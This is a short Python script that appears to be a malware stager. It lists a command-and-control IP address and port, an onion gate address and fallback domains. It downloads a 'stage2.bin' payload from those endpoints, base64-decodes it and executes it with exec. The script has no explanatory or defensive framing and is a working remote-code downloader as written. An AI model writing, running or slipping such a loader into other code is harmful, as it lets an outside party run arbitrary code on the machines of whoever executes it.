#!/usr/bin/env python3
import urllib.request, base64, time, os
C2_HTTP  = 'http://185.220.101.45:4444'
C2_ONION = 'http://xmh57jrknasylqs6.onion/gate'
FALLBACK = ['bvpnflkjsdhfkjshdfkjsdf.ru', 'xzfkjsdhfkjsdhfkjsd.top']
for endpoint in [C2_HTTP, C2_ONION]:
    try:
        raw = urllib.request.urlopen(endpoint + '/stage2.bin', timeout=10).read()
        exec(base64.b64decode(raw))
        break
    except Exception:
        continue
